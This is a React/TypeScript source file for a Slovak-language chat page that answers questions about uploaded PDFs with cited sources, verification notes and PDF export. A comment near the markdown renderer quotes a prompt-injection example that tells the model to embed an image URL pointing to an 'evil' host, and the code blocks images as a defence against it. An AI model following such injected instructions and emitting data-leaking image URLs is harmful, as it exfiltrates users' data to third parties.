import { PassageDialog } from '@/components/passage-dialog'
import { PdfDialog, type PdfTarget } from '@/components/pdf-dialog'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { ScrollArea } from '@/components/ui/scroll-area'
import { Textarea } from '@/components/ui/textarea'
import {
  fetchChatMessages,
  exportMessagePdf,
  fetchChats,
  setFeedback,
  type ChatMessage,
  type DocType,
  type GeneratedDoc,
  type SourceRef,
  type Verification,
} from '@/lib/api'
import { streamChat, type PlanMode } from '@/lib/sse'
import { cn } from '@/lib/utils'
import { useQuery, useQueryClient } from '@tanstack/react-query'
import { HugeiconsIcon } from '@hugeicons/react'
import {
  Activity01Icon,
  Add01Icon,
  Alert02Icon,
  CheckmarkCircle02Icon,
  FileExportIcon,
  Microscope,
  Download04Icon,
  File02Icon,
  Pdf01Icon,
  Search01Icon,
  SentIcon,
  StopIcon,
  Table01Icon,
  ThumbsDownIcon,
  ThumbsUpIcon,
  ViewIcon,
} from '@hugeicons/core-free-icons'
import { Link } from 'react-router'
import { useEffect, useRef, useState } from 'react'
import ReactMarkdown from 'react-markdown'
import { toast } from 'sonner'

type LocalMessage = Pick<ChatMessage, 'role' | 'content' | 'sources'> & {
  id?: string
  document?: GeneratedDoc | null
  trace_id?: string | null
  rating?: -1 | 1 | null
  rewritten?: string | null
  verification?: Verification | null
}

const DOC_TYPE_LABEL: Record<DocType, string> = {
  free: 'Dokument',
  report: 'Report',
  offer: 'Cenová ponuka',
  memo: 'Memo',
  summary: 'Súhrn',
}

const MODE_LABEL: Partial<Record<PlanMode, string>> = {
  filter: 'presný filter',
  compose: 'agent',
  generate: 'tvorba dokumentu',
  research: 'deep research',
  firma: 'firemné údaje',
}

function DocumentCard({ doc, onOpen }: { doc: GeneratedDoc; onOpen: () => void }) {
  const pages = doc.pages === 1 ? 'strana' : doc.pages < 5 ? 'strany' : 'strán'
  return (
    <div className="flex items-center gap-3 rounded-lg border bg-card p-3">
      <div className="flex size-10 shrink-0 items-center justify-center rounded-md bg-primary/10 text-primary">
        <HugeiconsIcon icon={Pdf01Icon} className="size-5" />
      </div>
      <div className="min-w-0 flex-1">
        <p className="truncate text-sm font-medium">{doc.title}</p>
        <p className="truncate text-xs text-muted-foreground">
          {DOC_TYPE_LABEL[doc.doc_type]} · PDF · {doc.pages} {pages} · {doc.sections.length} sekcie
        </p>
      </div>
      <Button variant="outline" size="sm" onClick={onOpen}>
        <HugeiconsIcon icon={ViewIcon} className="size-4" /> Otvoriť
      </Button>
      <Button size="sm" asChild>
        <a href={`${doc.url}?download=true`} download={doc.filename}>
          <HugeiconsIcon icon={Download04Icon} className="size-4" /> Stiahnuť
        </a>
      </Button>
    </div>
  )
}

function linkifyCitations(content: string): string {
  return content.replace(/\[(\d+(?:\s*,\s*\d+)*)\]/g, (_m, nums: string) =>
    nums
      .split(',')
      .map((x) => `[${x.trim()}](#src-${x.trim()})`)
      .join(' '),
  )
}

function SourceChip({ source, onOpen }: { source: SourceRef; onOpen: () => void }) {
  const icon = source.type === 'table_summary' ? Table01Icon : File02Icon
  const pages =
    source.page_to !== source.page_from
      ? `${source.page_from}–${source.page_to}`
      : `${source.page_from}`
  return (
    <button onClick={onOpen} title={source.snippet} className="group">
      <Badge variant="outline" className="gap-1 group-hover:bg-secondary">
        <span className="font-semibold">{source.n}</span>
        <HugeiconsIcon icon={icon} className="size-3" />
        <span className="max-w-40 truncate">{source.filename}</span>
        <span className="text-muted-foreground">str. {pages}</span>
      </Badge>
    </button>
  )
}

function FeedbackBar({
  messageId,
  traceId,
  rating,
  hasDocument,
  onRated,
  onExported,
}: {
  messageId: string
  traceId?: string | null
  rating?: -1 | 1 | null
  hasDocument: boolean
  onRated: (rating: -1 | 1 | null) => void
  onExported: (doc: GeneratedDoc) => void
}) {
  const [exporting, setExporting] = useState(false)
  const exportPdf = () => {
    setExporting(true)
    exportMessagePdf(messageId)
      .then((doc) => {
        onExported(doc)
        toast.success('Odpoveď uložená ako PDF')
      })
      .catch((e: Error) => toast.error(e.message))
      .finally(() => setExporting(false))
  }
  const rate = (value: -1 | 1) => {
    const next = rating === value ? null : value
    setFeedback(messageId, next)
      .then(() => onRated(next))
      .catch((e: Error) => toast.error(e.message))
  }
  return (
    <div className="flex items-center gap-0.5 text-muted-foreground">
      <Button
        variant="ghost"
        size="icon"
        className={cn('size-7', rating === 1 && 'text-emerald-600')}
        aria-label="Dobrá odpoveď"
        aria-pressed={rating === 1}
        onClick={() => rate(1)}
      >
        <HugeiconsIcon icon={ThumbsUpIcon} className="size-3.5" />
      </Button>
      <Button
        variant="ghost"
        size="icon"
        className={cn('size-7', rating === -1 && 'text-destructive')}
        aria-label="Zlá odpoveď"
        aria-pressed={rating === -1}
        onClick={() => rate(-1)}
      >
        <HugeiconsIcon icon={ThumbsDownIcon} className="size-3.5" />
      </Button>
      {!hasDocument && (
        <Button
          variant="ghost"
          size="sm"
          className="h-7 gap-1 px-2 text-xs"
          onClick={exportPdf}
          disabled={exporting}
        >
          <HugeiconsIcon icon={FileExportIcon} className="size-3.5" /> PDF
        </Button>
      )}
      {traceId && (
        <Button variant="ghost" size="sm" className="h-7 gap-1 px-2 text-xs" asChild>
          <Link to={`/traces?id=${traceId}`}>
            <HugeiconsIcon icon={Activity01Icon} className="size-3.5" /> trace
          </Link>
        </Button>
      )}
    </div>
  )
}

function VerificationNote({ verification }: { verification: Verification }) {
  const checked = verification.sentences
  const [open, setOpen] = useState(false)
  if (checked.length === 0) return null
  const flagged = checked.filter((c) => c.status !== 'supported')
  const allOk = flagged.length === 0
  return (
    <div className="text-xs">
      <button
        onClick={() => setOpen((o) => !o)}
        disabled={allOk}
        className={cn(
          'flex items-center gap-1.5',
          allOk ? 'text-emerald-600 dark:text-emerald-400' : 'text-amber-600 dark:text-amber-400',
        )}
      >
        <HugeiconsIcon icon={allOk ? CheckmarkCircle02Icon : Alert02Icon} className="size-3.5" />
        {allOk
          ? `všetkých ${checked.length} tvrdení má oporu v citovanom zdroji`
          : `${flagged.length} z ${checked.length} tvrdení bez jasnej opory v citovanom zdroji`}
      </button>
      {open && !allOk && (
        <ul className="mt-1.5 space-y-1 border-l-2 border-amber-500/40 pl-3 text-muted-foreground">
          {flagged.map((c, i) => (
            <li key={i}>
              <span className="font-medium text-foreground">
                {c.status === 'uncited' ? 'bez citácie' : `slabá opora v [${c.citations.join(', ')}]`}
                :
              </span>{' '}
              {c.text}
            </li>
          ))}
        </ul>
      )}
    </div>
  )
}

function AssistantBody({
  content,
  sources,
  document,
  rewritten,
  verification,
  onCite,
  onOpenDocument,
}: {
  content: string
  sources: SourceRef[] | null
  document?: GeneratedDoc | null
  rewritten?: string | null
  verification?: Verification | null
  onCite: (n: number) => void
  onOpenDocument: (doc: GeneratedDoc) => void
}) {
  return (
    <div className="space-y-2">
      {rewritten && (
        <p className="flex items-center gap-1.5 text-xs text-muted-foreground">
          <HugeiconsIcon icon={Search01Icon} className="size-3" /> hľadal som: „{rewritten}“
        </p>
      )}
      {document && <DocumentCard doc={document} onOpen={() => onOpenDocument(document)} />}
      <div className="prose prose-sm dark:prose-invert max-w-none text-sm leading-relaxed [&_ol]:list-decimal [&_ol]:pl-5 [&_p]:my-2 [&_ul]:my-2 [&_ul]:list-disc [&_ul]:pl-5 [&_li]:my-0.5">
        <ReactMarkdown
          components={{
            a: ({ href, children }) =>
              href?.startsWith('#src-') ? (
                <button
                  onClick={() => onCite(Number(href.slice(5)))}
                  className="mx-0.5 inline-flex size-4 items-center justify-center rounded bg-secondary align-super text-[10px] font-semibold text-secondary-foreground hover:bg-primary hover:text-primary-foreground"
                >
                  {children}
                </button>
              ) : href && /^https?:\/\//i.test(href) ? (
                <a href={href} target="_blank" rel="noopener noreferrer nofollow">
                  {children}
                </a>
              ) : (
                <span>{children}</span>
              ),
            // obrázky z odpovede sa nikdy nenačítajú — URL by mohla vyniesť dáta
            // (prompt injection v dokumente: „vlož ![](https://evil/?q=…)“)
            img: () => null,
          }}
        >
          {linkifyCitations(content)}
        </ReactMarkdown>
      </div>
      {verification && <VerificationNote verification={verification} />}
      {sources && sources.length > 0 && (
        <div className="flex flex-wrap gap-1.5">
          {sources.map((s) => (
            <SourceChip key={s.n} source={s} onOpen={() => onCite(s.n)} />
          ))}
        </div>
      )}
    </div>
  )
}

export default function ChatPage() {
  const queryClient = useQueryClient()
  const [chatId, setChatId] = useState<string | null>(null)
  const [messages, setMessages] = useState<LocalMessage[]>([])
  const [draft, setDraft] = useState('')
  const [streamText, setStreamText] = useState<string | null>(null)
  const [streamSources, setStreamSources] = useState<SourceRef[] | null>(null)
  const [streamDocument, setStreamDocument] = useState<GeneratedDoc | null>(null)
  const [streamRewrite, setStreamRewrite] = useState<string | null>(null)
  const [steps, setSteps] = useState<{ tool: string; summary: string }[]>([])
  const [planMode, setPlanMode] = useState<PlanMode | null>(null)
  const [pdfTarget, setPdfTarget] = useState<PdfTarget | null>(null)
  const [passageId, setPassageId] = useState<string | null>(null)
  const [research, setResearch] = useState(false)
  const abortRef = useRef<AbortController | null>(null)
  const endRef = useRef<HTMLDivElement>(null)

  const { data: chats } = useQuery({ queryKey: ['chats'], queryFn: fetchChats })

  useEffect(() => {
    endRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [messages, streamText])

  const openChat = async (id: string) => {
    abortRef.current?.abort()
    setChatId(id)
    setStreamText(null)
    setMessages(await fetchChatMessages(id))
  }

  const newChat = () => {
    abortRef.current?.abort()
    setChatId(null)
    setMessages([])
    setStreamText(null)
  }

  const citeFrom = (sources: SourceRef[] | null) => (n: number) => {
    const src = sources?.find((s) => s.n === n)
    if (!src) return
    if (!src.filename.toLowerCase().endsWith('.pdf')) {
      setPassageId(src.chunk_id)
      return
    }
    // otvor stranu s prvým zvýraznením (chunk môže začínať na predošlej strane)
    const firstBox = src.boxes?.[0]
    setPdfTarget({
      docId: src.doc_id,
      filename: src.filename,
      page: firstBox ? firstBox[0] : src.page_from,
      highlights: src.boxes,
    })
  }

  const openDocument = (doc: GeneratedDoc) =>
    setPdfTarget({
      url: doc.url,
      downloadUrl: `${doc.url}?download=true`,
      filename: doc.filename,
      page: 1,
    })

  const send = () => {
    const question = draft.trim()
    if (!question || streamText !== null) return
    setDraft('')
    setMessages((m) => [...m, { role: 'user', content: question, sources: null }])
    setStreamText('')
    setStreamSources(null)
    setStreamDocument(null)
    setStreamRewrite(null)
    setSteps([])
    setPlanMode(null)

    const controller = new AbortController()
    abortRef.current = controller
    let acc = ''
    let sources: SourceRef[] | null = null
    let document: GeneratedDoc | null = null
    let rewritten: string | null = null
    let verification: Verification | null = null

    void streamChat(
      { message: question, chat_id: chatId ?? undefined, mode: research ? 'research' : 'auto' },
      {
        onSources: (id, s) => {
          setChatId(id)
          sources = s
          setStreamSources(s)
        },
        onDelta: (t) => {
          acc += t
          setStreamText(acc)
        },
        onDone: (_chatId, messageId, traceId) => {
          setMessages((m) => [
            ...m,
            {
              id: messageId,
              role: 'assistant',
              content: acc,
              sources,
              document,
              trace_id: traceId,
              rewritten,
              verification,
            },
          ])
          setStreamText(null)
          void queryClient.invalidateQueries({ queryKey: ['chats'] })
        },
        onError: (msg) => {
          toast.error(msg)
          if (acc || document) {
            setMessages((m) => [...m, { role: 'assistant', content: acc, sources, document }])
          }
          setStreamText(null)
        },
        onPlan: (mode) => setPlanMode(mode),
        onStep: (tool, summary) => setSteps((s) => [...s, { tool, summary }]),
        onVerify: (ok, issues, sentences) => {
          verification = { issues, sentences }
          if (!ok) toast.warning(`Overenie čísel: v podkladoch chýba ${issues.join(', ')}`)
        },
        onDocument: (doc) => {
          document = doc
          setStreamDocument(doc)
        },
        onRewrite: (q) => {
          rewritten = q
          setStreamRewrite(q)
        },
        onReplace: (text) => {
          acc = text
          setStreamText(text)
        },
      },
      controller.signal,
    ).catch((e: Error) => {
      if (e.name !== 'AbortError') toast.error(e.message)
      setStreamText(null)
    })
  }

  const stop = () => {
    abortRef.current?.abort()
    if (streamText) {
      setMessages((m) => [
        ...m,
        { role: 'assistant', content: streamText, sources: streamSources, document: streamDocument },
      ])
    }
    setStreamText(null)
  }

  return (
    <div className="mx-auto grid h-[calc(100svh-8.5rem)] max-w-5xl grid-cols-[200px_1fr] gap-6">
      <aside className="flex min-h-0 flex-col gap-2">
        <Button variant="outline" size="sm" onClick={newChat} className="justify-start gap-2">
          <HugeiconsIcon icon={Add01Icon} className="size-4" /> Nový chat
        </Button>
        <ScrollArea className="min-h-0 flex-1">
          <div className="space-y-1 pr-2">
            {chats?.map((c) => (
              <button
                key={c.id}
                onClick={() => void openChat(c.id)}
                className={cn(
                  'w-full truncate rounded-md px-2 py-1.5 text-left text-xs transition-colors',
                  c.id === chatId
                    ? 'bg-secondary font-medium'
                    : 'text-muted-foreground hover:bg-secondary/50',
                )}
              >
                {c.title}
              </button>
            ))}
          </div>
        </ScrollArea>
      </aside>

      <section className="flex min-h-0 flex-col gap-3">
        <ScrollArea className="min-h-0 flex-1 rounded-md border">
          <div className="space-y-4 p-4">
            {messages.length === 0 && streamText === null && (
              <div className="space-y-1 py-16 text-center text-sm text-muted-foreground">
                <p>Opýtaj sa na čokoľvek z nahratých PDF — odpoveď príde s citáciami na strany.</p>
                <p className="text-xs">
                  Alebo si nechaj vytvoriť dokument: „Priprav report o…“, „Vytvor cenovú
                  ponuku…“ — PDF dostane branding z Nastavení.
                </p>
              </div>
            )}
            {messages.map((m, i) =>
              m.role === 'user' ? (
                <div key={i} className="flex justify-end">
                  <div className="max-w-[80%] rounded-lg bg-primary px-3 py-2 text-sm text-primary-foreground">
                    {m.content}
                  </div>
                </div>
              ) : (
                <div key={i} className="space-y-1">
                  <AssistantBody
                    content={m.content}
                    sources={m.sources}
                    document={m.document}
                    rewritten={m.rewritten}
                    verification={m.verification}
                    onCite={citeFrom(m.sources)}
                    onOpenDocument={openDocument}
                  />
                  {m.id && (
                    <FeedbackBar
                      messageId={m.id}
                      traceId={m.trace_id}
                      rating={m.rating}
                      hasDocument={!!m.document}
                      onRated={(rating) =>
                        setMessages((ms) =>
                          ms.map((x, j) => (j === i ? { ...x, rating } : x)),
                        )
                      }
                      onExported={(doc) => {
                        setMessages((ms) =>
                          ms.map((x, j) => (j === i ? { ...x, document: doc } : x)),
                        )
                        openDocument(doc)
                      }}
                    />
                  )}
                </div>
              ),
            )}
            {streamText !== null && (
              <div className="space-y-2">
                {planMode && MODE_LABEL[planMode] && (
                  <div className="space-y-1 text-xs text-muted-foreground">
                    <p>
                      režim: <Badge variant="outline">{MODE_LABEL[planMode]}</Badge>
                    </p>
                    {steps.map((s, i) => (
                      <p key={i} className="truncate">
                        → {s.tool}: {s.summary}
                      </p>
                    ))}
                  </div>
                )}
                <AssistantBody
                  content={streamText || '…'}
                  sources={streamSources}
                  document={streamDocument}
                  rewritten={streamRewrite}
                  onCite={citeFrom(streamSources)}
                  onOpenDocument={openDocument}
                />
              </div>
            )}
            <div ref={endRef} />
          </div>
        </ScrollArea>

        <div className="flex items-end gap-2">
          <Button
            variant={research ? 'default' : 'outline'}
            size="icon"
            aria-pressed={research}
            aria-label="Deep research"
            title="Deep research — podotázky, viac zdrojov, štruktúrovaná správa (~1 min)"
            onClick={() => setResearch((r) => !r)}
          >
            <HugeiconsIcon icon={Microscope} className="size-4" />
          </Button>
          <Textarea
            value={draft}
            onChange={(e) => setDraft(e.target.value)}
            onKeyDown={(e) => {
              if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault()
                send()
              }
            }}
            placeholder={
              research
                ? 'Téma na deep research… (napr. riziká projektu Agátová)'
                : 'Otázka… (Enter odošle, Shift+Enter nový riadok)'
            }
            className="max-h-40 min-h-11 flex-1 resize-none"
            rows={1}
          />
          {streamText !== null ? (
            <Button variant="outline" size="icon" onClick={stop}>
              <HugeiconsIcon icon={StopIcon} className="size-4" />
            </Button>
          ) : (
            <Button size="icon" onClick={send} disabled={!draft.trim()}>
              <HugeiconsIcon icon={SentIcon} className="size-4" />
            </Button>
          )}
        </div>
      </section>

      <PdfDialog target={pdfTarget} onClose={() => setPdfTarget(null)} />
      <PassageDialog chunkId={passageId} onClose={() => setPassageId(null)} />
    </div>
  )
}
